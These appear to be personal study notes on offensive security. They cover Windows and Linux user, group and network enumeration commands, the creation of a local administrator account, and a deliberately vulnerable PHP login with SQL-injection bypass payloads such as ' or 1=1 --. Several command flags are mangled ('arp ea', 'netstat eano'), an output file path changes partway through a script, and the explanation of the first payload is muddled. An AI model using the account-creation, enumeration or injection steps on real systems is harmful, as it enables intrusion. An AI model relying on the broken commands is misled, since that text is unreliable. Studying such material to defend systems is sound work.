Commands to list users and groups  (on windows) => `net` AND `wmic`
`net user` => list all users on this windows machine
`net user <specific_username>` => list  information about a specific user
`wmic useraccount list full` => more detaild info than `net user`

Combine wmic and net:
```powershell
for /F "skip=1" %i in ('wmic useraccount get name') do net user %i >>
c:\users.txt
```

```powershell
PS C:\Users\batu> wmic useraccount get name
Name
Administrator
batu
Guest
VarsayÄ±lanHesap
WDAGUtilityAccount
```
`skip=1` tells the for loop to skip the first line (Name)

```powershell
for /F "delims=* tokens=1 skip=4" %i in ('net localgroup') do net
localgroup %i >> c:\groups.txt
```
`skip=4` tells the for loop to skip the first 4 lines (unnecessary information presented by windows)

# Adding users and groups
```powershell
net user admin SecUr3P4Ssw0Rd! /add
net localgroup "System Admins" /add 
net localgroup Administrators "System Admins" /add # System admins are administrators
net localgroup "System Admins" admin /add # user "admin" is in "System Admins"
```

# Network info gathering (windows)
```batch
ipconfig /all >> c:\network.txt
route print >> c:\network.txt
arp ea >> c:\network.txt
netstat eano >> c:\network.txt
tasklist /V >> c:\network.txt
```

# Network info gathering (linux)
```bash
ip addr >> /tmp/net.txt
echo "-------------" >> /tmp/net
cat /etc/resolv.conf >> /tmp/net
echo "-------------" >> /tmp/net
netstat ern >> /tmp/net
echo "-------------" >> /tmp/net
netstat eanlp >> /tmp/net
```

# MetaSploit MeterPreter (Meta-Interpreter) Scripting
Metasploit scripts are written in **Ruby** (.rb)
Details later

# SQLi
Vulnerable code:
```php
<?php
session_start();
if ($_POST['login'] && $_POST['pass'])
{
$c = mysql_connect('localhost','testapp','test123');
$q = mysql_query("select * from testapp.login where login =
'{$_POST['login']}' and pass = '{$_POST['pass']}'",$c);
if (mysql_num_rows($q) > 0)
{
$_SESSION['authed'] = 1;
header('Location: search.php');
exit();
}
}
<FORM METHOD=POST>
Login: <INPUT TYPE=TEXT NAME=login><BR>
Pass: <INPUT TYPE=PASSWORD NAME=pass><BR>
<INPUT TYPE=SUBMIT VALUE="Login!"><BR>
</FORM>
?>
```
Type `' or 1=1`
```sql
select * from testapp.login where login = ' ' or 1=1 ' and pass =
'{$_POST['pass']}'
```
Second part is NOT true. So True AND Not True returns False. To solve this problem use comment syntax:
Type `' or 1=1 --` 
(do not forget to insert a blank space after dash dash -- for the code to run properly)
```sql
select * from testapp.login where login = ' ' or 1=1 --' and pass =
'{$_POST['pass']}'
```